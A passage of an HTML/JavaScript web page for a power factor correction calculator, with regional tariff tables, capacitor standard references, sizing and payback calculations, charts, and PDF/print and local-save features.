                            <li>• Small: 5, 10, 15, 25, 50</li>
                            <li>• Medium: 50, 100, 150, 200</li>
                            <li>• Large: 200, 300, 400, 500</li>
                        </ul>
                        <p class="text-sm mt-2">Ratio typically 1:2:4 or 1:1:2:4</p>
                    </div>
                </div>
            </div>
        </div>

        <!-- Country Examples -->
        <div class="glass-effect rounded-2xl p-8 mt-8">
            <h2 class="text-2xl font-bold text-white mb-6">
                <i class="fas fa-globe-americas text-blue-400"></i>
                Global Examples & Typical Costs
            </h2>
            
            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
                <div class="bg-white/10 rounded-lg p-4">
                    <h3 class="font-bold text-white mb-2">🇦🇪 UAE / Gulf Region</h3>
                    <ul class="text-gray-300 text-sm space-y-1">
                        <li>• Demand: $8-12/kVA/month</li>
                        <li>• Energy: $0.05-0.08/kWh</li>
                        <li>• Derating: 1.15 (hot climate)</li>
                        <li>• Common: 11kV, 33kV systems</li>
                    </ul>
                </div>
                <div class="bg-white/10 rounded-lg p-4">
                    <h3 class="font-bold text-white mb-2">🇺🇸 United States</h3>
                    <ul class="text-gray-300 text-sm space-y-1">
                        <li>• Demand: $10-20/kVA/month</li>
                        <li>• Energy: $0.08-0.15/kWh</li>
                        <li>• Derating: 1.0-1.1</li>
                        <li>• Common: 480V, 13.8kV systems</li>
                    </ul>
                </div>
                <div class="bg-white/10 rounded-lg p-4">
                    <h3 class="font-bold text-white mb-2">🇩🇪 Germany / Europe</h3>
                    <ul class="text-gray-300 text-sm space-y-1">
                        <li>• Demand: $20-30/kVA/month</li>
                        <li>• Energy: $0.25-0.35/kWh</li>
                        <li>• Derating: 1.0</li>
                        <li>• Common: 400V, 20kV systems</li>
                    </ul>
                </div>
                <div class="bg-white/10 rounded-lg p-4">
                    <h3 class="font-bold text-white mb-2">🇪🇬 Egypt / Africa</h3>
                    <ul class="text-gray-300 text-sm space-y-1">
                        <li>• Demand: $2-5/kVA/month</li>
                        <li>• Energy: $0.02-0.05/kWh</li>
                        <li>• Derating: 1.1-1.2</li>
                        <li>• Common: 380V, 11kV systems</li>
                    </ul>
                </div>
                <div class="bg-white/10 rounded-lg p-4">
                    <h3 class="font-bold text-white mb-2">🇨🇳 China / Asia</h3>
                    <ul class="text-gray-300 text-sm space-y-1">
                        <li>• Demand: $5-12/kVA/month</li>
                        <li>• Energy: $0.06-0.12/kWh</li>
                        <li>• Derating: 1.0-1.15</li>
                        <li>• Common: 380V, 10kV systems</li>
                    </ul>
                </div>
                <div class="bg-white/10 rounded-lg p-4">
                    <h3 class="font-bold text-white mb-2">🇧🇷 Brazil / S.America</h3>
                    <ul class="text-gray-300 text-sm space-y-1">
                        <li>• Demand: $8-15/kVA/month</li>
                        <li>• Energy: $0.10-0.18/kWh</li>
                        <li>• Derating: 1.1</li>
                        <li>• Common: 380V, 13.8kV systems</li>
                    </ul>
                </div>
            </div>
        </div>

        <!-- References -->
        <div class="glass-effect rounded-2xl p-8 mt-8">
            <h2 class="text-2xl font-bold text-white mb-6">
                <i class="fas fa-book text-blue-400"></i>
                Technical References & Standards
            </h2>
            
            <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
                <div class="bg-white/10 rounded-lg p-4">
                    <h3 class="font-bold text-white mb-2">IEC 60831-1/2</h3>
                    <p class="text-gray-300 text-sm">Shunt power capacitors of the self-healing type for a.c. systems having a rated voltage up to and including 1000 V</p>
                </div>
                <div class="bg-white/10 rounded-lg p-4">
                    <h3 class="font-bold text-white mb-2">IEEE Std 1036-2010</h3>
                    <p class="text-gray-300 text-sm">IEEE Guide for Application of Shunt Power Capacitors</p>
                </div>
                <div class="bg-white/10 rounded-lg p-4">
                    <h3 class="font-bold text-white mb-2">IEC 61921</h3>
                    <p class="text-gray-300 text-sm">Power capacitors - Duty and testing of capacitor banks</p>
                </div>
            </div>
        </div>

        <!-- Footer -->
        <div class="text-center mt-8 text-white/70 text-sm">
            <p>© 2024 Universal Power Factor Correction Calculator | Designed for Global Electrical Engineers</p>
            <p class="mt-2">
                <i class="fas fa-user-tie text-yellow-400"></i>
                Designed by <strong class="text-white">YASSER ZAKARIA</strong> | 
                <a href="https://www.linkedin.com/in/eng-yasser-zakaria/" target="_blank" class="text-white hover:text-yellow-300 transition-colors underline">
                    <i class="fab fa-linkedin text-blue-400"></i>
                    LinkedIn Profile
                </a>
            </p>
            <p class="mt-2">Always consult with certified electrical engineers and local authorities before implementation</p>
        </div>
    </div>

    <script>
        // Global variables for charts
        let powerFactorChart = null;
        let financialChart = null;
        let currentResults = null;

        // Country presets with typical values
        const countryPresets = {
            uae: {
                demandCharge: 10,
                energyCost: 0.06,
                deratingFactor: 1.15,
                voltage: '11'
            },
            saudi: {
                demandCharge: 8,
                energyCost: 0.05,
                deratingFactor: 1.15,
                voltage: '11'
            },
            egypt: {
                demandCharge: 3,
                energyCost: 0.03,
                deratingFactor: 1.1,
                voltage: '11'
            },
            usa: {
                demandCharge: 15,
                energyCost: 0.12,
                deratingFactor: 1.0,
                voltage: '13.8'
            },
            germany: {
                demandCharge: 25,
                energyCost: 0.30,
                deratingFactor: 1.0,
                voltage: '22'
            },
            custom: {
                demandCharge: '',
                energyCost: '',
                deratingFactor: 1.0,
                voltage: '11'
            }
        };

        function loadCountryPreset(country) {
            // Remove selected class from all presets
            document.querySelectorAll('.country-preset').forEach(el => {
                el.classList.remove('selected');
            });
            
            // Add selected class to clicked preset
            event.target.closest('.country-preset').classList.add('selected');
            
            const preset = countryPresets[country];
            document.getElementById('demandCharge').value = preset.demandCharge;
            document.getElementById('energyCost').value = preset.energyCost;
            document.getElementById('deratingFactor').value = preset.deratingFactor;
            document.getElementById('voltage').value = preset.voltage;
        }

        // Handle custom voltage selection
        document.getElementById('voltage').addEventListener('change', function() {
            const customDiv = document.getElementById('customVoltageDiv');
            if (this.value === 'custom') {
                customDiv.style.display = 'block';
            } else {
                customDiv.style.display = 'none';
            }
        });

        function getVoltage() {
            const voltageSelect = document.getElementById('voltage');
            if (voltageSelect.value === 'custom') {
                return parseFloat(document.getElementById('customVoltage').value);
            }
            return parseFloat(voltageSelect.value);
        }

        function calculatePFC() {
            // Get inputs
            const P = parseFloat(document.getElementById('activePower').value);
            const pf1 = parseFloat(document.getElementById('presentPF').value);
            const pf2 = parseFloat(document.getElementById('targetPF').value);
            const systemType = document.getElementById('systemType').value;
            const voltage = getVoltage();
            const demandCharge = parseFloat(document.getElementById('demandCharge').value);
            const energyCost = parseFloat(document.getElementById('energyCost').value);
            const deratingFactor = parseFloat(document.getElementById('deratingFactor').value);
            const operatingHours = parseFloat(document.getElementById('operatingHours').value);

            // Validation
            if (!P || !pf1 || !pf2 || !voltage || !demandCharge || !energyCost || !deratingFactor || !operatingHours) {
                showError('Please fill in all required fields');
                return;
            }

            if (pf1 <= 0 || pf1 > 1 || pf2 <= 0 || pf2 > 1) {
                showError('Power factor values must be between 0.1 and 1.0');
                return;
            }

            if (pf2 <= pf1) {
                showError('Target power factor must be higher than present power factor');
                return;
            }

            if (P <= 0) {
                showError('Active power must be greater than 0');
                return;
            }

            if (voltage <= 0) {
                showError('Voltage must be greater than 0');
                return;
            }

            if (deratingFactor < 1) {
                showError('Derating factor must be 1.0 or higher');
                return;
            }

            // Calculate angles
            const phi1 = Math.acos(pf1);
            const phi2 = Math.acos(pf2);

            // Calculate required reactive power
            const Qc = P * (Math.tan(phi1) - Math.tan(phi2));

            // Apply derating factor
            const QcDerated = Qc * deratingFactor;

            // Calculate suggested bank size
            let suggestedSize, steps;
            if (systemType === 'fixed') {
                suggestedSize = Math.ceil(QcDerated / 25) * 25; // Round up to nearest 25 kVAR
                steps = null;
            } else {
                [suggestedSize, steps] = calculateAutomaticSteps(QcDerated);
            }

            // Calculate financial benefits
            const benefits = calculateBenefits(P, pf1, pf2, demandCharge, energyCost, operatingHours);

            // Calculate payback period (rough estimate)
            const capacitorCost = estimateCapacitorCost(suggestedSize, voltage, systemType);
            const paybackMonths = capacitorCost / benefits.monthlySavings;

            // Store results globally for export
            currentResults = {
                P, pf1, pf2, Qc, QcDerated, suggestedSize, steps, systemType, voltage, 
                benefits, capacitorCost, paybackMonths, deratingFactor, demandCharge, energyCost, operatingHours
            };

            // Display results
            displayResults(P, pf1, pf2, Qc, QcDerated, suggestedSize, steps, systemType, voltage, benefits, capacitorCost, paybackMonths, deratingFactor);
            
            // Show charts section and create charts
            document.getElementById('chartsSection').style.display = 'block';
            createCharts(P, pf1, pf2, benefits, capacitorCost, paybackMonths);
        }

        function calculateAutomaticSteps(Qc) {
            let steps = [];
            let remaining = Qc;

            // Standard step sizes for different ranges
            let stepSizes;
            if (Qc <= 300) {
                stepSizes = [25, 50, 75, 100];
            } else if (Qc <= 1000) {
                stepSizes = [50, 100, 150, 200, 300];
            } else {
                stepSizes = [100, 200, 300, 400, 500];
            }

            // Use binary approach (1:2:4 ratio)
            stepSizes.sort((a, b) => b - a); // Descending order

            for (let size of stepSizes) {
                while (remaining >= size && steps.length < 8) { // Max 8 steps
                    steps.push(size);
                    remaining -= size;
                }
            }

            // Handle remainder
            if (remaining > 10) {
                steps.push(Math.ceil(remaining / 25) * 25);
            }

            const totalSize = steps.reduce((sum, step) => sum + step, 0);
            return [totalSize, steps];
        }

        function calculateBenefits(P, pf1, pf2, demandCharge, energyCost, operatingHours) {
            // Calculate apparent power before and after
            const S1 = P / pf1;
            const S2 = P / pf2;
            
            // Monthly demand savings
            const demandReduction = S1 - S2;
            const monthlySavings = demandReduction * demandCharge;
            
            // Energy loss reduction (approximate)
            const lossReduction = (Math.pow(S1, 2) - Math.pow(S2, 2)) / Math.pow(S1, 2);
            const energySavings = P * lossReduction * 0.02 * operatingHours * energyCost; // 2% loss assumption
            
            const annualSavings = monthlySavings * 12 + energySavings;
            
            return {
                monthlySavings: monthlySavings,
                annualSavings: annualSavings,
                demandReduction: demandReduction,
                energySavings: energySavings
            };
        }

        function estimateCapacitorCost(kvar, voltage, systemType) {
            // Rough cost estimation based on typical market prices
            let baseCost = kvar * 15; // $15 per kVAR base cost
            
            // Voltage multiplier
            if (voltage >= 33) baseCost *= 2.5;
            else if (voltage >= 11) baseCost *= 1.8;
            else if (voltage >= 6) baseCost *= 1.5;
            
            // System type multiplier
            if (systemType === 'automatic') {
                baseCost *= 2.5; // Automatic systems cost more
            }
            
            // Installation and accessories (30% of equipment cost)
            return baseCost * 1.3;
        }

        function displayResults(P, pf1, pf2, Qc, QcDerated, suggestedSize, steps, systemType, voltage, benefits, capacitorCost, paybackMonths, deratingFactor) {
            const resultsDiv = document.getElementById('results');
            
            let stepsHtml = '';
            if (steps) {
                const stepCounts = {};
                steps.forEach(step => {
                    stepCounts[step] = (stepCounts[step] || 0) + 1;
                });
                
                stepsHtml = Object.entries(stepCounts)
                    .map(([size, count]) => `${count} × ${size} kVAR`)
                    .join(' + ');
            }

            resultsDiv.innerHTML = `
                <div class="result-box">
                    <h3 class="text-xl font-bold mb-3">
                        <i class="fas fa-bolt"></i>
                        Required Reactive Power
                    </h3>
                    <p class="text-2xl font-bold">${Qc.toFixed(1)} kVAR</p>
                    <p class="text-sm mt-2">With derating factor (${deratingFactor}): ${QcDerated.toFixed(1)} kVAR</p>
                </div>

                <div class="result-box">
                    <h3 class="text-xl font-bold mb-3">
                        <i class="fas fa-cogs"></i>
                        Suggested Capacitor Bank
                    </h3>
                    <p class="text-2xl font-bold">${suggestedSize} kVAR</p>
                    <p class="text-sm mt-2">System Type: ${systemType.charAt(0).toUpperCase() + systemType.slice(1)}</p>
                    ${steps ? `<p class="text-sm mt-1">Configuration: ${stepsHtml}</p>` : ''}
                    <p class="text-sm mt-1">System Voltage: ${voltage} kV</p>
                </div>

                <div class="success-box">
                    <h3 class="text-xl font-bold mb-3">
                        <i class="fas fa-dollar-sign"></i>
                        Financial Analysis
                    </h3>
                    <div class="grid grid-cols-2 gap-4 text-sm">
                        <div>
                            <p class="font-semibold">Monthly Savings:</p>
                            <p class="text-lg">$${benefits.monthlySavings.toFixed(0)}</p>
                        </div>
                        <div>
                            <p class="font-semibold">Annual Savings:</p>
                            <p class="text-lg">$${benefits.annualSavings.toFixed(0)}</p>
                        </div>
                        <div>
                            <p class="font-semibold">Estimated Cost:</p>
                            <p class="text-lg">$${capacitorCost.toFixed(0)}</p>
                        </div>
                        <div>
                            <p class="font-semibold">Payback Period:</p>
                            <p class="text-lg">${paybackMonths.toFixed(1)} months</p>
                        </div>
                    </div>
                    <p class="text-xs mt-2">Demand Reduction: ${benefits.demandReduction.toFixed(1)} kVA | Energy Savings: $${benefits.energySavings.toFixed(0)}/year</p>
                </div>

                <div class="info-box">
                    <h3 class="text-lg font-bold mb-2">
                        <i class="fas fa-info-circle"></i>
                        Technical Summary
                    </h3>
                    <div class="grid grid-cols-2 gap-4 text-sm">
                        <div>
                            <p><strong>Present φ₁:</strong> ${(Math.acos(pf1) * 180 / Math.PI).toFixed(1)}°</p>
                            <p><strong>Target φ₂:</strong> ${(Math.acos(pf2) * 180 / Math.PI).toFixed(1)}°</p>
                            <p><strong>Present S₁:</strong> ${(P/pf1).toFixed(1)} kVA</p>
                        </div>
                        <div>
                            <p><strong>Target S₂:</strong> ${(P/pf2).toFixed(1)} kVA</p>
                            <p><strong>Derating Factor:</strong> ${deratingFactor}</p>
                            <p><strong>ROI:</strong> ${(1200/paybackMonths).toFixed(0)}% annually</p>
                        </div>
                    </div>
                </div>

                ${systemType === 'automatic' ? `
                <div class="warning-box">
                    <h3 class="text-lg font-bold mb-2">
                        <i class="fas fa-exclamation-triangle"></i>
                        Automatic Bank Recommendations
                    </h3>
                    <ul class="text-sm space-y-1">
                        <li>• Install power factor controller with 1% accuracy</li>
                        <li>• Consider harmonic analysis for VFD loads</li>
                        <li>• Use contactors rated for capacitive switching</li>
                        <li>• Install detuned reactors if THD > 5%</li>
                        <li>• Ensure adequate ventilation for local climate</li>
                        <li>• Program controller for optimal switching sequence</li>
                    </ul>
                </div>
                ` : `
                <div class="warning-box">
                    <h3 class="text-lg font-bold mb-2">
                        <i class="fas fa-exclamation-triangle"></i>
                        Fixed Bank Recommendations
                    </h3>
                    <ul class="text-sm space-y-1">
                        <li>• Install disconnect switch and protection</li>
                        <li>• Consider load variation throughout the day</li>
                        <li>• Monitor for leading power factor during light loads</li>
                        <li>• Use temperature-rated capacitors for local climate</li>
                        <li>• Install surge protection devices</li>
                    </ul>
                </div>
                `}
            `;
        }

        function showError(message) {
            const resultsDiv = document.getElementById('results');
            resultsDiv.innerHTML = `
                <div class="warning-box text-center">
                    <i class="fas fa-exclamation-triangle text-2xl mb-2"></i>
                    <p>${message}</p>
                </div>
            `;
        }

        function resetForm() {
            // Reset all form fields
            document.getElementById('activePower').value = '';
            document.getElementById('presentPF').value = '';
            document.getElementById('targetPF').value = '';
            document.getElementById('demandCharge').value = '';
            document.getElementById('energyCost').value = '';
            document.getElementById('deratingFactor').value = '1.0';
            document.getElementById('operatingHours').value = '8760';
            document.getElementById('voltage').value = '0.4';
            document.getElementById('systemType').value = 'fixed';
            document.getElementById('customVoltage').value = '';
            document.getElementById('customVoltageDiv').style.display = 'none';
            
            // Remove selected class from country presets
            document.querySelectorAll('.country-preset').forEach(el => {
                el.classList.remove('selected');
            });
            
            // Reset results
            document.getElementById('results').innerHTML = `
                <div class="info-box text-center">
                    <i class="fas fa-info-circle text-2xl mb-2"></i>
                    <p>Configure your country settings and system parameters, then click calculate to see results</p>
                </div>
            `;
        }

        function createCharts(P, pf1, pf2, benefits, capacitorCost, paybackMonths) {
            // Destroy existing charts
            if (powerFactorChart) powerFactorChart.destroy();
            if (financialChart) financialChart.destroy();

            // Power Factor Comparison Chart
            const pfCtx = document.getElementById('powerFactorChart').getContext('2d');
            powerFactorChart = new Chart(pfCtx, {
                type: 'bar',
                data: {
                    labels: ['Present System', 'After Correction'],
                    datasets: [{
                        label: 'Power Factor',
                        data: [pf1, pf2],
                        backgroundColor: ['#ff6b6b', '#4ecdc4'],
                        borderColor: ['#ff5252', '#26a69a'],
                        borderWidth: 2
                    }, {
                        label: 'Apparent Power (kVA)',
                        data: [P/pf1, P/pf2],
                        backgroundColor: ['#ffa726', '#66bb6a'],
                        borderColor: ['#ff9800', '#4caf50'],
                        borderWidth: 2,
                        yAxisID: 'y1'
                    }]
                },
                options: {
                    responsive: true,
                    plugins: {
                        legend: {
                            labels: { color: 'white' }
                        }
                    },
                    scales: {
                        y: {
                            type: 'linear',
                            display: true,
                            position: 'left',
                            max: 1,
                            ticks: { color: 'white' },
                            grid: { color: 'rgba(255,255,255,0.1)' }
                        },
                        y1: {
                            type: 'linear',
                            display: true,
                            position: 'right',
                            ticks: { color: 'white' },
                            grid: { drawOnChartArea: false, color: 'rgba(255,255,255,0.1)' }
                        },
                        x: {
                            ticks: { color: 'white' },
                            grid: { color: 'rgba(255,255,255,0.1)' }
                        }
                    }
                }
            });

            // Financial Benefits Chart
            const finCtx = document.getElementById('financialChart').getContext('2d');
            financialChart = new Chart(finCtx, {
                type: 'doughnut',
                data: {
                    labels: ['Investment Cost', 'Annual Savings', 'Net Benefit (5 years)'],
                    datasets: [{
                        data: [
                            capacitorCost,
                            benefits.annualSavings,
                            benefits.annualSavings * 5 - capacitorCost
                        ],
                        backgroundColor: ['#ff6b6b', '#4ecdc4', '#45b7d1'],
                        borderColor: ['#ff5252', '#26a69a', '#2196f3'],
                        borderWidth: 2
                    }]
                },
                options: {
                    responsive: true,
                    plugins: {
                        legend: {
                            labels: { color: 'white' }
                        }
                    }
                }
            });
        }

        function generatePDFReport() {
            if (!currentResults) {
                alert('Please calculate results first!');
                return;
            }

            const { jsPDF } = window.jspdf;
            const doc = new jsPDF();
            
            // Add title
            doc.setFontSize(20);
            doc.setTextColor(40, 40, 40);
            doc.text('Power Factor Correction Report', 20, 30);
            
            // Add date and designer
            doc.setFontSize(12);
            doc.text(`Generated: ${new Date().toLocaleDateString()}`, 20, 40);
            doc.setFontSize(10);
            doc.setTextColor(100, 100, 100);
            doc.text('Designed by: YASSER ZAKARIA | LinkedIn: linkedin.com/in/eng-yasser-zakaria/', 20, 50);
            
            // System Parameters
            doc.setFontSize(16);
            doc.text('System Parameters:', 20, 60);
            doc.setFontSize(12);
            doc.text(`Active Power: ${currentResults.P} kW`, 25, 70);
            doc.text(`Present Power Factor: ${currentResults.pf1}`, 25, 80);
            doc.text(`Target Power Factor: ${currentResults.pf2}`, 25, 90);
            doc.text(`System Voltage: ${currentResults.voltage} kV`, 25, 100);
            doc.text(`System Type: ${currentResults.systemType}`, 25, 110);
            
            // Results
            doc.setFontSize(16);
            doc.text('Calculation Results:', 20, 130);
            doc.setFontSize(12);
            doc.text(`Required Reactive Power: ${currentResults.Qc.toFixed(1)} kVAR`, 25, 140);
            doc.text(`With Derating: ${currentResults.QcDerated.toFixed(1)} kVAR`, 25, 150);
            doc.text(`Suggested Bank Size: ${currentResults.suggestedSize} kVAR`, 25, 160);
            
            // Financial Analysis
            doc.setFontSize(16);
            doc.text('Financial Analysis:', 20, 180);
            doc.setFontSize(12);
            doc.text(`Monthly Savings: $${currentResults.benefits.monthlySavings.toFixed(0)}`, 25, 190);
            doc.text(`Annual Savings: $${currentResults.benefits.annualSavings.toFixed(0)}`, 25, 200);
            doc.text(`Estimated Cost: $${currentResults.capacitorCost.toFixed(0)}`, 25, 210);
            doc.text(`Payback Period: ${currentResults.paybackMonths.toFixed(1)} months`, 25, 220);
            doc.text(`ROI: ${(1200/currentResults.paybackMonths).toFixed(0)}% annually`, 25, 230);
            
            // Add recommendations
            doc.setFontSize(16);
            doc.text('Recommendations:', 20, 250);
            doc.setFontSize(10);
            const recommendations = [
                '• Install power factor controller with 1% accuracy',
                '• Consider harmonic analysis for VFD loads',
                '• Use contactors rated for capacitive switching',
                '• Install surge protection devices',
                '• Ensure adequate ventilation for local climate',
                '• Regular maintenance and monitoring required'
            ];
            
            recommendations.forEach((rec, index) => {
                doc.text(rec, 25, 260 + (index * 8));
            });
            
            // Save the PDF
            doc.save(`Power_Factor_Report_${new Date().toISOString().split('T')[0]}.pdf`);
        }

        function printReport() {
            if (!currentResults) {
                alert('Please calculate results first!');
                return;
            }
            
            // Create a new window with printable content
            const printWindow = window.open('', '_blank');
            const printContent = `
                <!DOCTYPE html>
                <html>
                <head>
                    <title>Power Factor Correction Report</title>
                    <style>
                        body { font-family: Arial, sans-serif; margin: 20px; }
                        .header { text-align: center; margin-bottom: 30px; }
                        .section { margin-bottom: 20px; }
                        .section h3 { color: #333; border-bottom: 2px solid #333; }
                        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
                        .result-item { margin: 5px 0; }
                        @media print { body { margin: 0; } }
                    </style>
                </head>
                <body>
                    <div class="header">
                        <h1>Power Factor Correction Report</h1>
                        <p>Generated: ${new Date().toLocaleDateString()}</p>
                        <p style="font-size: 12px; color: #666;">Designed by: YASSER ZAKARIA | LinkedIn: linkedin.com/in/eng-yasser-zakaria/</p>
                    </div>
                    
                    <div class="grid">
                        <div class="section">
                            <h3>System Parameters</h3>
                            <div class="result-item">Active Power: ${currentResults.P} kW</div>
                            <div class="result-item">Present Power Factor: ${currentResults.pf1}</div>
                            <div class="result-item">Target Power Factor: ${currentResults.pf2}</div>
                            <div class="result-item">System Voltage: ${currentResults.voltage} kV</div>
                            <div class="result-item">System Type: ${currentResults.systemType}</div>
                        </div>
                        
                        <div class="section">
                            <h3>Calculation Results</h3>
                            <div class="result-item">Required Reactive Power: ${currentResults.Qc.toFixed(1)} kVAR</div>
                            <div class="result-item">With Derating: ${currentResults.QcDerated.toFixed(1)} kVAR</div>
                            <div class="result-item">Suggested Bank Size: ${currentResults.suggestedSize} kVAR</div>
                            <div class="result-item">Demand Reduction: ${currentResults.benefits.demandReduction.toFixed(1)} kVA</div>
                        </div>
                    </div>
                    
                    <div class="section">
                        <h3>Financial Analysis</h3>
                        <div class="grid">
                            <div>
                                <div class="result-item">Monthly Savings: $${currentResults.benefits.monthlySavings.toFixed(0)}</div>
                                <div class="result-item">Annual Savings: $${currentResults.benefits.annualSavings.toFixed(0)}</div>
                            </div>
                            <div>
                                <div class="result-item">Estimated Cost: $${currentResults.capacitorCost.toFixed(0)}</div>
                                <div class="result-item">Payback Period: ${currentResults.paybackMonths.toFixed(1)} months</div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="section">
                        <h3>Technical Summary</h3>
                        <div class="result-item">Present Angle: ${(Math.acos(currentResults.pf1) * 180 / Math.PI).toFixed(1)}°</div>
                        <div class="result-item">Target Angle: ${(Math.acos(currentResults.pf2) * 180 / Math.PI).toFixed(1)}°</div>
                        <div class="result-item">Present Apparent Power: ${(currentResults.P/currentResults.pf1).toFixed(1)} kVA</div>
                        <div class="result-item">Target Apparent Power: ${(currentResults.P/currentResults.pf2).toFixed(1)} kVA</div>
                        <div class="result-item">ROI: ${(1200/currentResults.paybackMonths).toFixed(0)}% annually</div>
                    </div>
                </body>
                </html>
            `;
            
            printWindow.document.write(printContent);
            printWindow.document.close();
            printWindow.focus();
            printWindow.print();
        }

        function saveCalculation() {
            if (!currentResults) {
                alert('Please calculate results first!');
                return;
            }
            
            const calculationName = prompt('Enter a name for this calculation:', `Calculation_${new Date().toLocaleDateString()}`);
            if (!calculationName) return;
            
            const savedCalculations = JSON.parse(localStorage.getItem('powerFactorCalculations') || '[]');
            const newCalculation = {
                id: Date.now(),
                name: calculationName,
                date: new Date().toISOString(),
                results: currentResults
            };
            
            savedCalculations.push(newCalculation);
            localStorage.setItem('powerFactorCalculations', JSON.stringify(savedCalculations));
            
            alert('Calculation saved successfully!');
        }

        function showSavedCalculations() {
            const savedCalculations = JSON.parse(localStorage.getItem('powerFactorCalculations') || '[]');
            
            if (savedCalculations.length === 0) {
                alert('No saved calculations found!');
                return;
            }
            
            let html = `
                <div class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50" onclick="closeSavedCalculations()">
                    <div class="bg-white rounded-lg p-6 max-w-4xl max-h-96 overflow-y-auto" onclick="event.stopPropagation()">
                        <h3 class="text-xl font-bold mb-4 text-gray-800">Saved Calculations</h3>
                        <div class="space-y-3">
            `;
            
            savedCalculations.reverse().forEach(calc => {
                const date = new Date(calc.date).toLocaleDateString();
                html += `
                    <div class="border rounded p-3 bg-gray-50">
                        <div class="flex justify-between items-center">
                            <div>
                                <h4 class="font-semibold text-gray-800">${calc.name}</h4>
                                <p class="text-sm text-gray-600">Date: ${date}</p>
                                <p class="text-sm text-gray-600">Power: ${calc.results.P}kW, PF: ${calc.results.pf1}→${calc.results.pf2}</p>
                            </div>
                            <div class="space-x-2">
                                <button onclick="loadCalculation(${calc.id})" class="px-3 py-1 bg-blue-500 text-white rounded text-sm">Load</button>
                                <button onclick="deleteCalculation(${calc.id})" class="px-3 py-1 bg-red-500 text-white rounded text-sm">Delete</button>
                            </div>
                        </div>
                    </div>
                `;
            });
            
            html += `
                        </div>
                        <button onclick="closeSavedCalculations()" class="mt-4 px-4 py-2 bg-gray-500 text-white rounded">Close</button>
                    </div>
                </div>
            `;
            
            document.body.insertAdjacentHTML('beforeend', html);
        }

        function loadCalculation(id) {
            const savedCalculations = JSON.parse(localStorage.getItem('powerFactorCalculations') || '[]');
            const calculation = savedCalculations.find(calc => calc.id === id);
            
            if (!calculation) {
                alert('Calculation not found!');
                return;
            }
            
            const results = calculation.results;
            
            // Load form values
            document.getElementById('activePower').value = results.P;
            document.getElementById('presentPF').value = results.pf1;
            document.getElementById('targetPF').value = results.pf2;
            document.getElementById('demandCharge').value = results.demandCharge;
            document.getElementById('energyCost').value = results.energyCost;
            document.getElementById('deratingFactor').value = results.deratingFactor;
            document.getElementById('operatingHours').value = results.operatingHours;
            document.getElementById('voltage').value = results.voltage;
            document.getElementById('systemType').value = results.systemType;
            
            closeSavedCalculations();
            
            // Recalculate to show results
            calculatePFC();
        }

        function deleteCalculation(id) {
            if (!confirm('Are you sure you want to delete this calculation?')) return;
            
            let savedCalculations = JSON.parse(localStorage.getItem('powerFactorCalculations') || '[]');
            savedCalculations = savedCalculations.filter(calc => calc.id !== id);
            localStorage.setItem('powerFactorCalculations', JSON.stringify(savedCalculations));
            
            closeSavedCalculations();
            showSavedCalculations();
        }

        function closeSavedCalculations() {
            const modal = document.querySelector('.fixed.inset-0');
            if (modal) modal.remove();
        }

        function showComparison() {
            const savedCalculations = JSON.parse(localStorage.getItem('powerFactorCalculations') || '[]');
            
            if (savedCalculations.length < 2) {
                alert('You need at least 2 saved calculations to compare!');
                return;
            }
            
            let html = `
                <div class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50" onclick="closeComparison()">
                    <div class="bg-white rounded-lg p-6 max-w-6xl max-h-96 overflow-y-auto" onclick="event.stopPropagation()">
                        <h3 class="text-xl font-bold mb-4 text-gray-800">Compare Calculations</h3>
                        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
            `;
            
            savedCalculations.slice(-6).forEach(calc => {
                const date = new Date(calc.date).toLocaleDateString();
                const roi = (1200/calc.results.paybackMonths).toFixed(0);
                html += `
                    <div class="border rounded p-4 bg-gray-50">
                        <h4 class="font-semibold text-gray-800 mb-2">${calc.name}</h4>
                        <div class="text-sm text-gray-600 space-y-1">
                            <p><strong>Date:</strong> ${date}</p>
                            <p><strong>Power:</strong> ${calc.results.P} kW</p>
                            <p><strong>PF:</strong> ${calc.results.pf1} → ${calc.results.pf2}</p>
                            <p><strong>Required:</strong> ${calc.results.Qc.toFixed(1)} kVAR</p>
                            <p><strong>Bank Size:</strong> ${calc.results.suggestedSize} kVAR</p>
                            <p><strong>Monthly Savings:</strong> $${calc.results.benefits.monthlySavings.toFixed(0)}</p>
                            <p><strong>Annual Savings:</strong> $${calc.results.benefits.annualSavings.toFixed(0)}</p>
                            <p><strong>Cost:</strong> $${calc.results.capacitorCost.toFixed(0)}</p>
                            <p><strong>Payback:</strong> ${calc.results.paybackMonths.toFixed(1)} months</p>
                            <p><strong>ROI:</strong> ${roi}%</p>
                        </div>
                    </div>
                `;
            });
            
            html += `
                        </div>
                        <button onclick="closeComparison()" class="mt-4 px-4 py-2 bg-gray-500 text-white rounded">Close</button>
                    </div>
                </div>
            `;
            
            document.body.insertAdjacentHTML('beforeend', html);
        }

        function closeComparison() {
            const modal = document.querySelector('.fixed.inset-0');
            if (modal) modal.remove();
        }

        function showDetailedCostAnalysis() {
            if (!currentResults) {
                alert('Please calculate results first!');
                return;
            }
            
            const results = currentResults;
            
            // Detailed cost breakdown
            const capacitorCost = results.suggestedSize * 15; // Base cost per kVAR
            const voltageFactor = results.voltage >= 33 ? 2.5 : results.voltage >= 11 ? 1.8 : results.voltage >= 6 ? 1.5 : 1;
            const systemFactor = results.systemType === 'automatic' ? 2.5 : 1;
            
            const equipmentCost = capacitorCost * voltageFactor * systemFactor;
            const installationCost = equipmentCost * 0.3;
            const protectionCost = equipmentCost * 0.15;
            const commissioning = equipmentCost * 0.1;
            const totalProjectCost = equipmentCost + installationCost + protectionCost + commissioning;
            
            // 10-year analysis
            const yearlyBenefits = [];
            for (let year = 1; year <= 10; year++) {
                const inflationFactor = Math.pow(1.03, year - 1); // 3% annual inflation
                yearlyBenefits.push(results.benefits.annualSavings * inflationFactor);
            }
            
            const totalSavings10Years = yearlyBenefits.reduce((sum, benefit) => sum + benefit, 0);
            const netBenefit10Years = totalSavings10Years - totalProjectCost;
            const irr = ((totalSavings10Years / totalProjectCost) ** (1/10) - 1) * 100;
            
            let html = `
                <div class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50" onclick="closeCostAnalysis()">
                    <div class="bg-white rounded-lg p-6 max-w-5xl max-h-96 overflow-y-auto" onclick="event.stopPropagation()">
